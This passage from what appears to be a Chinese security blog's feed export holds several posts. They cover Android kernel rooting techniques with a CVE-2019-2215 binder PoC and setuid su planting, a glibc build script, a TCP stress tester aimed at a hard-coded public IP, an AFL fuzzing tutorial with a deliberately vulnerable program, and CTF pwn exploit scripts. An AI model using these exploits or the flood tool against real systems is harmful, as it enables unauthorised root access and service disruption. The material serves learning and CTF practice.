kernel_cap_struct cap_bset; struct kernel_cap_struct cap_ambient; void *security; /* subjective LSM security */&#125;; 安全凭证 task_secutity 安全域 12345678 struct task_ security_ struct &#123; u32 osid; /* SID prior to last execve */ u32 sid; /* current SID */ u32 exec_sid;/* exec SID */ u32 create_sid;/* fscreate SID */ u32 keycreate_sid; /* keycreate SID */ u32 sockcreate_sid; /* fscreate SID */&#125;; 内核关键全局变量selinux_enforcingselinux_enabledinit_stack对于没有KASLR的设备地址固定，偏移固定。 关闭内核缓释机制1、关闭addr_limit 内核线程栈低偏移8字节为addr_limit,将addr_limit 改为-1（0xffffffffffffffff）,关闭之后即可任意读写内核。 2、 关闭DAC 修改进程安全凭证cred中进程id相关值uid、gid等为init进程的值 3、关闭CAP 修改进程安全凭证cred中的cap相关值 cap_inheritable等为init进程的值 4、 关闭SELinux 修改selinux_enforcing 为0 修改selinux_enbaled 为0 修改进程安全凭证cred中的security安全域 osid、sid、exec_sid、create_sid、kercreate_sid、sockcreate_sid为init进程的值 5、关闭SECCOMP 修改thread_info中的flags,将seccomp位置0 12#define TLE_SECCOMP 11#define _TIF_SECCOMP (1 &lt;&lt; TIE_SECCOMP) 修改task_struct 中的seccomp中的mode为0 1234struct seccopm &#123; int mode; struct seccomp_filter *filter;&#125; 持久化root只适用于低版本Android：123456adb shell mount -0 remount,rw /systemadb push su /system/xbin/suadb shell chown 0.0 /system/xbin/suadb shell chmod 06755 /system/xbin/suadb shell mount -0 remount,ro /systemadb install Superuser.apk 高版本(Android 7.0 之后) 无解 Android 内核任意地址读写思路1、用户态不能直接访问内核态2、需要借助内核函数完成内核任意地址读写 系统调用由内核完成 寻找系统调用中搬到参数合法的方式-&gt;addr_limit read/write、readv/writev、recvmsg/sendmsg 等 Android源码阅读网站 Google官方提供https://cs.android.com/android/platform/superproject 在线xref http://androidxref.com/ Android环境搭建本地环境 ubuntu 16.04 SDK安装https://developer.android.com/studio/releases/platform-tools下载最新版29（截止2020.1） 确定adb可以使用安装可参考 https://blog.csdn.net/u011974797/article/details/78973012 NDK安装https://developer.android.com/ndk/downloads下载最新版r20b（截止2020.1）确定ndk-build可以使用安装可参考 https://blog.csdn.net/fanx9339/article/details/81116332 Android root实验给定一个含有驱动漏洞的Android虚拟机，通过该驱动漏洞实现root 1.1 确定Android版本号adb shell getprop ro.build.version.release 1.2 寻找有漏洞的驱动设备搜索 cdev_init()函数cdev_init() 加载驱动设备函数qword_FFFFFFC00055C438 里面注册 dev_open,dev_ioctl等 1.3 提取kernel符号表python ./vmlinux.py ./test/pixel_vmlinux 1.4 IDA加载kernel并导入符号表vmlinux.py -&gt; C:\Program Files\IDA x.x\loaders\ 1.5 分析漏洞并完成kernel任意地址读写通过fop发现ioctl中存在任意地址读写漏洞 1.6 提权到rootCVE-2019-2215 复现影响版本 Android 9.0 kernel 4.4 driver/android/binder.c123456789101112131415static long binder_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)&#123;...switch (cmd) &#123;...case BINDER_THREAD_EXIT:binder_debug(BINDER_DEBUG_THREADS, "%d:%d exit\n",proc-&gt;pid, thread-&gt;pid);binder_free_thread(proc, thread);thread = NULL;break;...&#125; &#125; Android kernel 4.4 driver/android/binder.c123456789static int binder_free_thread(struct binder_proc *proc,struct binder_thread *thread) &#123;...if (send_reply)binder_send_failed_reply(send_reply, BR_DEAD_REPLY);binder_release_work(&amp;thread-&gt;todo);kfree(thread);binder_stats_deleted(BINDER_STAT_THREAD);return active_transactions; &#125; PoC1234567891011121314#include &lt;fcntl.h&gt;#include &lt;sys/epoll.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;unistd.h&gt;#define BINDER_THREAD_EXIT 0x40046208ulint main()&#123;int fd, epfd;struct epoll_event event = &#123; .events = EPOLLIN &#125;;fd = open("/dev/binder0", O_RDONLY);epfd = epoll_create(1000);epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &amp;event);ioctl(fd, BINDER_THREAD_EXIT, NULL);&#125; ##其他命令连接 Android shell./adb shell 1、获取手机系统信息（ CPU，厂商名称等）adb shell “cat /system/build.prop | grep “product””2、获取手机系统版本adb shell getprop ro.build.version.release 3、获取手机系统api版本adb shell getprop ro.build.version.sdk 4、获取手机设备型号adb -d shell getprop ro.product.model 5、获取手机厂商名称adb -d shell getprop ro.product.brand 6、获取手机的序列号有两种方式 1、 adb get-serialno 2、 adb shell getprop ro.serialno 7、获取手机内存信息adb shell cat /proc/meminfo 8、获取手机存储信息adb shell df 9、获取手机物理密度adb shell wm density]]></content>
      <categories>
        <category>android</category>
      </categories>
      <tags>
        <tag>android</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[批量下载并编译glibc]]></title>
    <url>%2F2019%2F12%2F12%2F%E6%89%B9%E9%87%8F%E4%B8%8B%E8%BD%BD%E5%B9%B6%E7%BC%96%E8%AF%91glibc%2F</url>
    <content type="text"><![CDATA[build.sh123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106#!/bin/sh# install som libecho "install som lib"sudo apt-get install gawk -ysudo apt-get install bison -ysudo apt-get install gcc-multilib -ysudo apt-get install g++-multizlib -ycd /sudo mkdir -p /glibccd /glibcsudo mkdir -p sourcecd source# get the source of glibcGet_Glibc_Source()&#123; if [ ! -d "/glibc/source/glibc-"$1 ]; then sudo wget http://mirrors.ustc.edu.cn/gnu/libc/glibc-$1.tar.gz sudo tar xf glibc-$1.tar.gz else echo "[*] /glibc/source/glibc-"$1" already exists..." fi &#125;Install_Glibc_x64()&#123; if [ -f "/glibc/x64/"$1"/lib/libc-"$1".so" ];then echo "x64 glibc "$1" already installed!" return fi #echo $1 #echo "/glibc/x64/"$1"/lib/libc-"$1".so" sudo mkdir -p /glibc/x64/$1 #wget http://mirrors.ustc.edu.cn/gnu/libc/glibc-$1.tar.gz #tar xf glibc-$1.tar.gz cd glibc-$1 sudo mkdir build cd build sudo ../configure --prefix=/glibc/x64/$1/ --disable-werror --enable-debug=yes sudo make sudo make install cd ../../ #sudo rm glibc-$1.tar.gz sudo rm -rf ./glibc-$1/build&#125;Install_Glibc_x86()&#123; if [ -f "/glibc/x86/"$1"/lib/libc-"$1".so" ];then echo "x86 glibc "$1" already installed!" return fi #echo $1 #echo "/glibc/x64/"$1"/lib/libc-"$1".so" sudo mkdir -p /glibc/x86/$1 #wget http://mirrors.ustc.edu.cn/gnu/libc/glibc-$1.tar.gz #tar xf glibc-$1.tar.gz #cd x86 cd glibc-$1 sudo mkdir build cd build sudo ../configure --prefix=/glibc/x86/$1/ --disable-werror --enable-debug=yes --host=i686-linux-gnu --build=i686-linux-gnu CC="gcc -m32" CXX="g++ -m32" sudo make sudo make install cd ../../ #sudo rm glibc-$1.tar.gz sudo rm -rf ./glibc-$1/build&#125;#delte the tar of glibcDelete_Glibc_Tar() &#123; sudo rm glibc-$1.tar.gz&#125;GLIBC_VERSION=$1#echo $&#123;GLIBC_VERSION&#125;if [ -n "$GLIBC_VERSION" ]; then #echo 1 #cd x64 Get_Glibc_Source $GLIBC_VERSION Install_Glibc_x64 $GLIBC_VERSION #cd .. #cd x86 Install_Glibc_x86 $GLIBC_VERSION Delete_Glibc_Tar $GLIBC_VERSION #cd ..else for GLIBC_VERSION in '2.19' '2.23' '2.24' '2.25' '2.26' '2.27' '2.28' '2.29' do #echo 2 #cd x64 Get_Glibc_Source $GLIBC_VERSION Install_Glibc_x64 $GLIBC_VERSION #cd ../x86 Install_Glibc_x86 $GLIBC_VERSION Delete_Glibc_Tar $GLIBC_VERSION #cd .. donefi 使用方法下载并编译 glibc-2.23 ，放在了 /glibc 目录下 ，里面包括源码，x86和x64下的带符号的 libc-2.23.so, ld-2.23.so 1./build 2.23 编译所有版本(没有参数意味着编译所有版本) 1./build 参考项目 : https://github.com/ray-cp/pwn_debug/blob/master/build.sh]]></content>
      <categories>
        <category>shell</category>
      </categories>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[分布式高并发tcp压力测试]]></title>
    <url>%2F2019%2F12%2F10%2F%E5%88%86%E5%B8%83%E5%BC%8F%E9%AB%98%E5%B9%B6%E5%8F%91tcp%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95%2F</url>
    <content type="text"><![CDATA[task_manager.py12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182from multiprocessing.managers import BaseManagerfrom multiprocessing import freeze_support, Queuefrom locustTcp import locust# 任务个数task_number = 3# 收发队列task_que = Queue(task_number)result_queue = Queue(task_number)def get_task(): return task_quedef get_result(): return result_queue# 创建类似的queueManagerclass QueueManager(BaseManager): passdef win_run(): delay_time_average, delay_time_average_total = 0, 0 delay_time_max, delay_time_min, error_times, success_times = 0, 0, 0, 0 time_max = [] time_min = [] # 注册在网络上，callable 关联了Queue 对象 # 将Queue对象在网络中暴露 # window下绑定调用接口不能直接使用lambda，所以只能先定义函数再绑定 QueueManager.register('get_task_queue', callable=get_task) QueueManager.register('get_result_queue', callable=get_result) # 绑定端口和设置验证口令 manager = QueueManager(address=('192.168.43.140', 8001), authkey=b'locust') # 启动管理，监听信息通道 manager.start() try: # 通过网络获取任务队列和结果队列 task = manager.get_task_queue() result = manager.get_result_queue() # 添加任务 for i in range(task_number): n = locust task.put(n) print('try get result...') for i in range(task_number): data = result.get(timeout=10000) print('result%d is %s' % (i+1, data)) data = eval(data) print("平均往返时延(ms): %s 最大时延: %s 最小时延: %s 拒绝连接次数: %s 成功连接数: %s\n" % (data[0], data[2], data[3], data[4], data[5])) delay_time_average_total += data[0] time_max.append(data[2]) time_min.append(data[3]) error_times += data[4] success_times += data[5] delay_time_average = delay_time_average_total/task_number delay_time_max = max(time_max) delay_time_min = min(time_min) print("最终统计 平均往返时延(ms): %s 最大时延: %s 最小时延: %s 拒绝连接次数: %s 成功连接数: %s\n" % (delay_time_average, delay_time_max, delay_time_min, error_times, success_times)) except Exception as e: print('Manager error:', e) finally: manager.shutdown() print("Work is done")if __name__ == '__main__': # window下多进程可能有问题，添加这句话缓解 freeze_support() win_run() task_worker.py1234567891011121314151617181920212223242526272829303132333435#!/usr/bin/python3# -*-coding:utf-8 -*-from multiprocessing.managers import BaseManager# 创建类似的QueueManager:class QueueManager(BaseManager): pass# 实现第一步：使用QueueManager注册获取Queue的方法名称QueueManager.register('get_task_queue')QueueManager.register('get_result_queue')# 实现第二步：连接到服务器:server_addr = '192.168.43.140'print('Connect to server %s...' % server_addr)# 端口和验证口令注意保持与服务进程设置的完全一致:m = QueueManager(address=(server_addr, 8001), authkey=b'locust')# 从网络连接:m.connect()# 实现第三步：获取Queue的对象:task = m.get_task_queue()result = m.get_result_queue()# 实现第四步：从task队列取任务,并把结果写入result队列:task_num = 0while not task.empty(): locust = task.get(True, timeout=5) # 获取任务 task_num += 1 a = locust() # 执行任务 # result.put(str(a[-1][1])) # 传输数据到task_manager result.put(str(a[-1][0])) # 传输数据到task_manager# 处理结束:print("任务完成个数: %d" % task_num)print('worker exit.') locustTcp.py123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106#!/usr/bin/python3# -*-coding:utf-8 -*-from socket import *import threadingimport timeHOST = "122.51.252.101" # tcp压力测试ip 122.51.252.101PORT = 7474thread_number = 1000BUF_SIZE = 1024Address = (HOST, PORT)message = "hello"tcp_connect_data = []threadLock = threading.Lock() # 进程锁# AF_INET用于不同机器之间的通信 AF_UNIX只能用于本机内进程之间的通信。# SOCK_STREAM是基于TCP的，数据传输比较有保障。SOCK_DGRAM是基于UDP的，专门用于局域网# 获取毫秒级时间def get_time_ms(): ct = time.time() # 时间戳 local_time = time.localtime(ct) # 本地化时间 cart_time_strftime = time.strftime("%Y-%m-%d %H:%M:%S", local_time) # 格式化时间 cart_time_strftime_ms = (ct - int(ct)) * 1000 ms = "%s.%03d" % (cart_time_strftime, cart_time_strftime_ms) # 拼接，获取毫秒级时间 return ms, ct# 建立tcp连接def tcp_connect(): error_flag = 0 tcp_socket = socket(AF_INET, SOCK_STREAM) # 创建socket对象 tcp连接 tcp_socket.settimeout(20) # 设置最大连接时间20s time1 = get_time_ms() try: tcp_socket.connect(Address) """ receive_data = tcp_socket.recv(BUF_SIZE) # print(receive_data.decode('utf-8')) tcp_socket.send(message.encode('utf-8')) """ except Exception as e: error_flag = 1 print("tcpConnError", e) else: pass time2 = get_time_ms() delay_time = (time2[1] - time1[1])*1000 data = delay_time, error_flag tcp_connect_data.append(data) return dataclass MyThread(threading.Thread): def __init__(self, thread_id): threading.Thread.__init__(self) self.threadId = thread_id def run(self): threadLock.acquire() # 获取锁，用于线程同步 tcp_connect() threadLock.release() # 释放锁，开启下一个线程 def info(self): print(self.threadId)def locust(): test_thread = MyThread(0) test_thread.start() test_thread.join() delay_time_max = tcp_connect_data[test_thread.threadId][0] # 初始化最大时延和最小时延 delay_time_min = delay_time_max error_times, success_times, total_time = 0, 0, 0 # 初始化连接数 threads = [] data = [] for i in range(1, thread_number+1): t = MyThread(i) threads.append(t) for t in threads: # t.setDaemon(True) # 把多线程设置为守护线程 t.start() # 开始执行多线程 # t.info() t.join() # 等待线程执行完成 delay_time = tcp_connect_data[t.threadId][0] error_flag = tcp_connect_data[t.threadId][1] if delay_time_max &lt; delay_time: # 更新最大时延和最小时延 delay_time_max = delay_time if delay_time_min &gt; delay_time: delay_time_min = delay_time total_time += delay_time delay_time_average = total_time/t.threadId error_times += error_flag success_times = t.threadId - error_times print("%s 执行时间为 %s\n" % (t, get_time_ms()[0])) # 输出执行时间 print("平均往返时延(ms): %s 本次时延: %s 最大时延: %s 最小时延: %s 拒绝连接次数: %s 成功连接数: %s\n" % (delay_time_average, delay_time, delay_time_max, delay_time_min, error_times, success_times)) thread_data = (delay_time_average, delay_time, delay_time_max, delay_time_min, error_times, success_times), t data.append(thread_data) return dataif __name__ == '__main__': locust()]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[AFL漏洞挖掘]]></title>
    <url>%2F2019%2F11%2F12%2FAFL%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%2F</url>
    <content type="text"><![CDATA[转载于 ：https://www.freebuf.com/articles/system/191543.html 一 前言模糊测试（Fuzzing）技术作为漏洞挖掘最有效的手段之一，近年来一直是众多安全研究人员发现漏洞的首选技术。AFL、LibFuzzer、honggfuzz等操作简单友好的工具相继出现，也极大地降低了模糊测试的门槛。 二 AFL简介AFL（American Fuzzy Lop）是由安全研究员Michał Zalewski（@lcamtuf）开发的一款基于覆盖引导（Coverage-guided）的模糊测试工具，它通过记录输入样本的代码覆盖率，从而调整输入样本以提高覆盖率，增加发现漏洞的概率。其工作流程大致如下： ①从源码编译程序时进行插桩，以记录代码覆盖率（Code Coverage）； ②选择一些输入文件，作为初始测试集加入输入队列（queue）； ③将队列中的文件按一定的策略进行“突变”； ④如果经过变异文件更新了覆盖范围，则将其保留添加到队列中; ⑤上述过程会一直循环进行，期间触发了crash的文件会被记录下来。 三 选择和评估测试的目标开始Fuzzing前，首先要选择一个目标。 AFL的目标通常是接受外部输入的程序或库，输入一般来自文件（也可以Fuzzing一个网络程序）。 用什么语言编写AFL主要用于C/C++程序的测试，所以这是我们寻找软件的最优先规则。（也有一些基于AFL的JAVA Fuzz程序如kelinci、java-afl等） 是否开源AFL既可以对源码进行编译时插桩，也可以使用AFL的QEMU mode对二进制文件进行插桩，但是前者的效率相对来说要高很多，在Github上很容易就能找到很多合适的项目。 程序版本目标应该是该软件的最新版本，不然辛辛苦苦找到一个漏洞，却发现早就被上报修复了就尴尬了。 是否有示例程序、测试用例如果目标有现成的基本代码示例，特别是一些开源的库，可以方便我们调用该库不用自己再写一个程序；如果目标存在测试用例，那后面构建语料库时也省事儿一点。 项目规模某些程序规模很大，会被分为好几个模块，为了提高Fuzz效率，在Fuzzing前，需要定义Fuzzing部分。这里推荐一下源码阅读工具Understand，它treemap功能，可以直观地看到项目结构和规模。 程序曾出现过漏洞如果某个程序曾曝出过多次漏洞，那么该程序有仍有很大可能存在未被发现的安全漏洞。 四 构建语料库AFL需要一些初始输入数据（也叫种子文件）作为Fuzzing的起点，这些输入甚至可以是毫无意义的数据，AFL可以通过启发式算法自动确定文件格式结构。lcamtuf就在博客中给出了一个有趣的例子——对djpeg进行Fuzzing时，仅用一个字符串”hello”作为输入，最后凭空生成大量jpge图像！ 尽管AFL如此强大，但如果要获得更快的Fuzzing速度，那么就有必要生成一个高质量的语料库，这一节就解决如何选择输入文件、从哪里寻找这些文件、如何精简找到的文件三个问题。 1. 选择(1) 有效的输入 尽管有时候无效输入会产生bug和崩溃，但有效输入可以更快的找到更多执行路径。 (2) 尽量小的体积 较小的文件会不仅可以减少测试和处理的时间，也能节约更多的内存，AFL给出的建议是最好小于1 KB，但其实可以根据自己测试的程序权衡，这在AFL文档的perf_tips.txt中有具体说明。 2. 寻找使用项目自身提供的测试用例 目标程序bug提交页面 使用格式转换器，用从现有的文件格式生成一些不容易找到的文件格式： afl源码的testcases目录下提供了一些测试用例 其他开源的语料库 3. 修剪网上找到的一些大型语料库中往往包含大量的文件，这时就需要对其精简，这个工作有个术语叫做——语料库蒸馏（Corpus Distillation）。AFL提供了两个工具来帮助我们完成这部工作——afl-cmin和afl-tmin。(1) 移除执行相同代码的输入文件——afl-cmin afl-cmin的核心思想是：尝试找到与语料库全集具有相同覆盖范围的最小子集。举个例子：假设有多个文件，都覆盖了相同的代码，那么就丢掉多余的文件。其使用方法如下：1$ afl-cmin -i input_dir -o output_dir -- /path/to/tested/program [params] 更多的时候，我们需要从文件中获取输入，这时可以使用“@@”代替被测试程序命令行中输入文件名的位置。Fuzzer会将其替换为实际执行的文件：1$ afl-cmin -i input_dir -o output_dir -- /path/to/tested/program [params] @@ (2) 减小单个输入文件的大小——afl-tmin整体的大小得到了改善，接下来还要对每个文件进行更细化的处理。afl-tmin缩减文件体积的原理这里就不深究了，有机会会在后面文章中解释，这里只给出使用方法（其实也很简单，有兴趣的朋友可以自己搜一搜）。 afl-tmin有两种工作模式，instrumented mode和crash mode。默认的工作方式是instrumented mode1$ afl-tmin -i input_file -o output_file -- /path/to/tested/program [params] @@ 如果指定了参数-x，即crash mode，会把导致程序非正常退出的文件直接剔除。 1$ afl-tmin -x -i input_file -o output_file -- /path/to/tested/program [params] @@ afl-tmin接受单个文件输入，所以可以用一条简单的shell脚本批量处理。如果语料库中文件数量特别多，且体积特别大的情况下，这个过程可能花费几天甚至更长的时间！ 1for i in *; do afl-tmin -i $i -o tmin-$i -- ~/path/to/tested/program [params] @@; done;s 五 构建被测试程序前面说到，AFL从源码编译程序时进行插桩，以记录代码覆盖率。这个工作需要使用其提供的两种编译器的wrapper编译目标程序，和普通的编译过程没有太大区别 1. afl-gcc模式afl-gcc/afl-g++作为gcc/g++的wrapper，它们的用法完全一样，前者会将接收到的参数传递给后者，我们编译程序时只需要将编译器设置为afl-gcc/afl-g++就行，如下面演示的那样。如果程序不是用autoconf构建，直接修改Makefile文件中的编译器为afl-gcc/g++也行。 1$ ./configure CC="afl-gcc" CXX="afl-g++" 在Fuzzing共享库时，可能需要编写一个简单demo，将输入传递给要Fuzzing的库（其实大多数项目中都自带了类似的demo）。这种情况下，可以通过设置LD_LIBRARY_PATH让程序加载经过AFL插桩的.so文件，不过最简单的方法是静态构建，通过以下方式实现： 1$ ./configure --disable-shared CC="afl-gcc" CXX="afl-g++" 2. LLVM模式LLVM Mode模式编译程序可以获得更快的Fuzzing速度，进入llvm_mode目录进行编译，之后使用afl-clang-fast构建序程序即可，如下所示： 1$ cd llvm_mode$ apt-get install clang$ export LLVM_CONFIG=`which llvm-config` &amp;&amp; make &amp;&amp; cd ..$ ./configure --disable-shared CC="afl-clang-fast" CXX="afl-clang-fast++" 在使用高版本的clang编译时可能会报错，换成clang-3.9后通过编译，如果你的系统默认安装的clang版本过高，可以安装多个版本然后使用update-alternatives切换。 六 开始Fuzzing1. 白盒测试(1) 测试插桩程序编译好程序后，可以选择使用afl-showmap跟踪单个输入的执行路径，并打印程序执行的输出、捕获的元组（tuples），tuple用于获取分支信息，从而衡量衡量程序覆盖情况，下一篇文章中会详细的解释，这里可以先不用管。 1$ afl-showmap -m none -o /dev/null -- ./build/bin/imagew 23.bmp out.png[*] Executing './build/bin/imagew'...-- Program output begins --23.bmp -&gt; out.pngProcessing: 13x32-- Program output ends --[+] Captured 1012 tuples in '/dev/null'. 使用不同的输入，正常情况下afl-showmap会捕获到不同的tuples，这就说明我们的的插桩是有效的，还有前面提到的afl-cmin就是通过这个工具来去掉重复的输入文件。 (2) 执行fuzzer在执行afl-fuzz前，如果系统配置为将核心转储文件（core）通知发送到外部程序。 将导致将崩溃信息发送到Fuzzer之间的延迟增大，进而可能将崩溃被误报为超时，所以我们得临时修改core_pattern文件，如下所示： 1echo core &gt;/proc/sys/kernel/core_pattern 之后就可以执行afl-fuzz了，通常的格式是： 1$ afl-fuzz -i testcase_dir -o findings_dir /path/to/program [params] 或者使用“@@”替换输入文件，Fuzzer会将其替换为实际执行的文件： 1$ afl-fuzz -i testcase_dir -o findings_dir /path/to/program @@ 如果没有什么错误，Fuzzer就正式开始工作了。首先，对输入队列中的文件进行预处理；然后给出对使用的语料库可警告信息，比如下图中提示有个较大的文件（14.1KB），且输入文件过多；最后，开始Fuzz主循环，显示状态窗口。 测试源代码:1234567891011121314151617181920212223242526272829303132333435#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;string.h&gt; #include &lt;signal.h&gt; int vuln(char *str)&#123; int len = strlen(str); if(str[0] == 'A' &amp;&amp; len == 66) &#123; raise(SIGSEGV); //如果输入的字符串的首字符为A并且长度为66，则异常退出 &#125; else if(str[0] == 'F' &amp;&amp; len == 6) &#123; raise(SIGSEGV); //如果输入的字符串的首字符为F并且长度为6，则异常退出 &#125; else &#123; printf("it is good!\n"); &#125; return 0;&#125;int main(int argc, char *argv[])&#123; char buf[100]=&#123;0&#125;; gets(buf);//存在栈溢出漏洞 printf(buf);//存在格式化字符串漏洞 vuln(buf); return 0;&#125; AFL状态窗口 ① Process timing:Fuzzer运行时长、以及距离最近发现的路径、崩溃和挂起经过了多长时间。 ② Overall results：Fuzzer当前状态的概述。 ③ Cycle progress：我们输入队列的距离。 ④ Map coverage：目标二进制文件中的插桩代码所观察到覆盖范围的细节。 ⑤ Stage progress：Fuzzer现在正在执行的文件变异策略、执行次数和执行速度。 ⑥ Findings in depth：有关我们找到的执行路径，异常和挂起数量的信息。 ⑦ Fuzzing strategy yields：关于突变策略产生的最新行为和结果的详细信息。 ⑧ Path geometry：有关Fuzzer找到的执行路径的信息。 ⑨ CPU load：CPU利用率 (3) 使用screen一次Fuzzing过程通常会持续很长时间，如果这期间运行afl-fuzz实例的终端终端被意外关闭了，那么Fuzzing也会被中断。而通过在screen session中启动每个实例，可以方便的连接和断开。1$ screen afl-fuzz -i testcase_dir -o findings_dir /path/to/program @@ 也可以为每个session命名，方便重新连接。1$ screen -S fuzzer1$ afl-fuzz -i testcase_dir -o findings_dir /path/to/program [params] @@[detached from 6999.fuzzer1]$ screen -r fuzzer1 ... 2. 黑盒测试所谓黑盒测试，通俗地讲就是对没有源代码的程序进行测试，这时就要用到AFL的QEMU模式了。启用方式和LLVM模式类似，也要先编译。但注意，因为AFL使用的QEMU版本太旧，util/memfd.c中定义的函数memfd_create()会和glibc中的同名函数冲突，在这里可以找到针对QEMU的patch，之后运行脚本build_qemu_support.sh就可以自动下载编译。 12$ sudo apt-get install libini-config-dev libtool-bin automake bison libglib2.0-dev -y$ $ cd qemu_mode$ build_qemu_support.sh$ cd .. &amp;&amp; make install 现在起，只需添加-Q选项即可使用QEMU模式进行Fuzzing。1$ afl-fuzz -Q -i testcase_dir -o findings_dir /path/to/program [params] @@ 七 结束测试1.何时结束检查afl-fuzz工作状态的目的是为何时停止测试提供依据，通常来说符合下面几种情况时就可以停掉了。 （1）状态窗口中”cycles done”字段颜色变为绿色该字段的颜色可以作为何时停止测试的参考，随着周期数不断增大，其颜色也会由洋红色，逐步变为黄色、蓝色、绿色。当其变为绿色时，继续Fuzzing下去也很难有新的发现了，这时便可以通过Ctrl-C停止afl-fuzz。 （2）距上一次发现新路径（或者崩溃）已经过去很长时间了，至于具体多少时间还是需要自己把握，比如长达一个星期或者更久估计大家也都没啥耐心了吧。 （3）目标程序的代码几乎被测试用例完全覆盖，这种情况好像很少见，但是对于某些小型程序应该还是可能的，至于如何计算覆盖率将在下面介绍。 （4）上面提到的pythia提供的各种数据中，一旦path covera达到99％（通常来说不太可能），如果不期望再跑出更多crash的话就可以中止fuzz了，因为很多crash可能是因为相同的原因导致的；还有一点就是correctness的值达到1e-08，根据pythia开发者的说法，这时从上次发现path/uniq crash到下一次发现之间大约需要1亿次执行，这一点也可以作为衡量依据。 2. 输出结果afl-fuzz的输出目录中存在很多文件，有时想要写一个辅助工具可能就要用到其中的文件。下面以多个fuzz实例并行测试时的同步目录为例： queue：存放所有具有独特执行路径的测试用例。 crashes：导致目标接收致命signal而崩溃的独特测试用例。 crashes/README.txt：保存了目标执行这些crash文件的命令行参数。 hangs：导致目标超时的独特测试用例。 fuzzer_stats：afl-fuzz的运行状态。 plot_data：用于afl-plot绘图。 八 处理测试结果到了这里，我们可能已经跑出了一大堆的crashes，那么接下来的步骤，自然是确定造成这些crashes的bug是否可以利用，怎么利用？这是另一个重要方面。当然，个人觉得这比前面提到的内容都要困难得多，这需要对常见的二进制漏洞类型、操作系统的安全机制、代码审计和调试等内容都有一定深度的了解。]]></content>
      <categories>
        <category>漏洞挖掘</category>
      </categories>
      <tags>
        <tag>漏洞挖掘</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[360杯 pwn writeup]]></title>
    <url>%2F2019%2F11%2F01%2F360%E6%9D%AF-pwn-writeup%2F</url>
    <content type="text"><![CDATA[pwn1格式化字符串漏洞，但跟平时做的还不太一样，这题输入的数据存到了bss段，任意地址写的时候，不能像平时那样直接写到栈上，解析栈上的数据，这里需要找一个合适的跳板，来修改函数返回地址。当时没有做出来，看了360官方writeup之后，觉得利用的过程很巧妙，学到了一些新的姿势，对栈上的数据又有了更深刻的认识。 解题思路 泄露libc_addr,stack_addr 突破输入次数的限制，修改i的值 在跳板写上ret_addr所在的栈地址，再修改ret_addr为onegadget exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109from pwn import *context.log_level = 'debug'p = process('./pwn1')gadgets = [0x3a80c,0x3ac5e,0x3a812,0x3a819,0x5f065,0x5f066]def HL(value): lis = [] high = value &gt;&gt; 16 low = value &amp; 0xffff lis.append(low) lis.append(high) return lis def input(payload): p.recvuntil("2. Exit") p.send('1') p.recvuntil("something") p.sendline(payload) def exit(): p.recvuntil("2. Exit") p.send('2') ## leak addressinput("%5$p%12$p%15$p")p.recvline()leaked = p.recvline()bin_base = int(leaked[2:10], 16) - 0x1fb8stack_addr = int(leaked[12:20], 16)var_addr = stack_addr - 0x2C + 0x3target_addr = stack_addr - 0x4libc_base = int(leaked[22:30],16) - 247 - 0x18540shell_addr = libc_base + gadgets[1]bp = bin_base + 0x81c#gdb.attach(p,'b *' + str(hex(bp)))log.info("binary_base address is %x" % bin_base)log.info("stack address is %x" % stack_addr)log.info("libc_base address is %x" % libc_base)log.info("var address is %x" % var_addr)log.info("target address is %x" % target_addr)## Modify var i valueslis = HL(var_addr)print lispause()input("%" + str(lis[0]) + "c%21$hn")input("%255d%57$hhn")## Write one_gadget at ret_addr through the target_addrlis = HL(target_addr)input("%" + str(lis[0]) + "c%21$hn")lis = HL(target_addr+2)input("%" + str(lis[0]) + "d%22$hn")lis = HL(shell_addr)input("%" + str(lis[0]) + "c%57$hn")input("%" + str(lis[1]) + "c%59$hn")exit()p.interactive() pwn2整数溢出，需要注意的是数值在比较的时候是用本身的数据，而做运算（如加减）的时候，用的是自身的补码。此题输入的字符数中不让有”-“符号。 解题思路 pass1绕过: x1和y1都是有符号整数，令x1为359，y1为0xffffffff就可以绕过判断 pass2绕过: 利用整数溢出里面的回绕，int类型大小为4个字节，最大存的数为0x00000000ffffffff,若两数相乘为0x0000000100000168 ，产出溢出结果等于0x168 exp1234567891011121314151617181920212223242526from pwn import *#context.log_level = 'debug' p = process("./pwn2")if __name__=='__main__': p.recvuntil("x:") p.sendline(str(359)) p.recvuntil("y:") p.sendline(str(2**32-1)) p.recvuntil("Please input x and y:") #gdb.attach(p) p.sendline(str(8)+" "+str(0x0000000100000168/8)) p.interactive()]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019 RoarCTF pwn writeup]]></title>
    <url>%2F2019%2F10%2F14%2F2019-RoarCTF-pwn-writeup%2F</url>
